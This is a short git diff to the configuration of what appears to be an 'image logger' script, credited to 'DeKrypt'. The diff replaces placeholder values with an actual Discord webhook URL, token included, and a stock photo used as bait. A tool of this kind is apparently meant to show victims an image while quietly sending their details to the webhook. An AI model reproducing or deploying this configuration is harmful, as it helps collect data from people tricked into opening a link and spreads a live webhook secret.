@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1339955971560308736/77RRmr2o_H3km_31zzDqxWxPyLykqTkjukuHL_j1csexwlApoRNVBlwE4pxn3k7alwYm",
+    "image": "https://img.freepik.com/fotos-premium/asiatischer-fetter-junge-isst-hamburger-lebensmittelkonzepte-die-koerperliche-gesundheitsprobleme-bei-kindern-verursachen-verursacht-leichte-krankheiten-wie-fettleibigkeit-weisser-hintergrund-isoliert-speicherplatz-kopieren_42128-527.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
